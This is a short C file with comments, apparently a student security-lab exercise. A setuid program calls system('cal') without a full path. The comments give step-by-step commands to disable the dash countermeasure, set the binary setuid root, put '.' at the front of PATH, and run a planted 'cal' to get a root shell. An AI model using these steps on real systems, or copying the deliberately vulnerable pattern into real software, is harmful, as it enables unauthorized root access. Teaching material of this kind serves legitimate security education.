/* Problem-04
   Group-06
   program invoking another external program */
#include<stdlib.h>
void main(){
	//calling the calendar program using system() but not with its complete path
	system("cal");
}

/*............Instructions

$sudo ln -sf /bin/zsh /bin/sh   //this instruction is required to disable the countermeasure in recent ubuntu version dash shell
$gcc abc.c -o abc
$./abc
This will out the calendar
Now save cal.c in the current directory ( cal.c is attached )

//elevate the privileges of abc.c
$sudo chown root abc
$sudo chmod 4755 abc

// compile the malicious cal.c

$gcc cal.c -o cal

//Now export the path variable and set it value as shown

$export PATH=.:$PATH
$echo $PATH

//ouput is :
.:.:.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

$./abc     //run abc.c now

you will see :
bash-5.0#                      //root shell gained
..........................................................................*/


